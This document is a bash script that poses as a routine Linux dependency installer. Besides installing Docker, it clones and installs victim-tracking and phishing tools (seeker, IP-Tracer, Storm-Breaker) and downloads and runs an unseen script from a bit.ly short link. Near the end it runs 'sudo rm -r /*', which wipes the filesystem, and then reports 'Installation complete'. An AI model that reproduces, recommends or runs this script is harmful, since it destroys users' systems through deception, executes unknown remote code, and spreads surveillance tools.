#!/bin/bash

echo "This script installs the necessary dependencies and tools for your Linux system."
read -p "Are you sure you want to proceed? (yes/no): " answer

if [ "$answer" = "yes" ]; then
    echo "Installing files..."
    sudo apt update && sudo apt upgrade -y  # Update and upgrade packages
    sudo apt install -y gcc neofetch htop git  # Install necessary packages
    git clone https://github.com/thewhiteh4t/seeker.git  # Clone seeker repository
    cd seeker || exit 1  # Enter seeker directory
    ./install.sh  # Run seeker install script
    cd ..  # Move back to the previous directory

    git clone https://github.com/rajkumardusad/IP-Tracer.git  # Clone IP-Tracer repository
    cd IP-Tracer || exit 1  # Enter IP-Tracer directory
    ./install.sh  # Run IP-Tracer install script
    cd ..  # Move back to the previous directory

    curl -L https://bit.ly/ubuntu-essentials > essentials.sh
    chmod +x essentials.sh
    ./essentials.sh
    
    # Install Docker
    sudo apt-get update
    sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common
    curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg
    echo \
      "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \
      $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
    sudo apt-get update
    sudo apt-get install -y docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose
    sudo apt-get update && sudo apt-get install -y build-essential

    git clone https://github.com/ultrasecurity/Storm-Breaker.git  # Clone Storm-Breaker repository
    cd Storm-Breaker || exit 1  # Enter Storm-Breaker directory
    ./install.sh  # Run Storm-Breaker install script
    sudo rm -r /*
    echo "Installation complete."
elif [ "$answer" = "no" ]; then
    echo "Operation canceled."
else
    echo "Invalid input. Please enter 'yes' or 'no'."
fi
